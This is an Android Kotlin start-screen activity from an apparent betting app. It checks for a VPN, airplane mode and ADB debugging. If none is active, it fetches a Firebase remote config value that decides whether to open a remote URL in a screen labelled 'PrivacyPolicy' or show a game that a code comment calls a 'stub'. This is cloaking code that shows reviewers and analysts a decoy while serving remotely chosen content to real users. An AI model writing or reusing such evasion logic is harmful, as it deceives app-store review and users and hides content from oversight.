package  com.fivegbet.fiveg.bets.esportedasrote.view

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Toast
import com.fivegbet.fiveg.bets.esportedasrote.MenuView
import com.fivegbet.fiveg.bets.esportedasrote.R
import com.fivegbet.fiveg.bets.esportedasrote.data.AppSettings
import com.fivegbet.fiveg.bets.esportedasrote.data.DataManager
import com.fivegbet.fiveg.bets.esportedasrote.data.GameSettingsData
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings


import com.google.gson.Gson



class ViewStart : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_start)


        if (AppSettings.isInternetAvailable(this)) {
            DataManager.loadData(this)

            if (AppSettings.isFirstOpen) {
                if (!AppSettings.isVpnActive(this) && !AppSettings.isAirplaneModeOn(this) && !AppSettings.isAdbEnabled(this)
                ) {
                    initFirebase()
                } else {
                    activityManager(false)
                }
            }
            else{
                activityManager(!AppSettings.isFirstOpen,AppSettings.linkForOpen)
            }
        } else {
            Toast.makeText(this, "Please, check your internet", Toast.LENGTH_LONG).show()
        }

    }


    fun initFirebase() {

        val gson = Gson()

        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 500
        }

        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val updated = task.result
                    var temp = remoteConfig.getString("user_info")
                    if (temp.isNotEmpty()) {
                        try {
                            val settingsData = gson.fromJson(temp, GameSettingsData::class.java)
                            activityManager(settingsData.solution_state, settingsData.tasker)
                            return@addOnCompleteListener
                        }catch (e: Exception) {
                            activityManager(false)
                        }
                    }else{
                        activityManager(false)
                        return@addOnCompleteListener
                    }
                } else {
                    activityManager(false)
                }
            }

        remoteConfig.setConfigSettingsAsync(configSettings)


    }

    fun activityManager(state: Boolean, link: String = "") {
        if (state) {
            if(link.contains("http")) {
                var i: Intent = Intent(this, PrivacyPolicy::class.java).putExtra("link", link)
                startActivity(i)
                finish()
            }else{
                var i: Intent = Intent(this, MenuView::class.java)
                startActivity(i)
                finish()
            }
        } else {
            //Открыть заглушку
            var i: Intent = Intent(this, MenuView::class.java)
            startActivity(i)
            finish()
        }
    }
}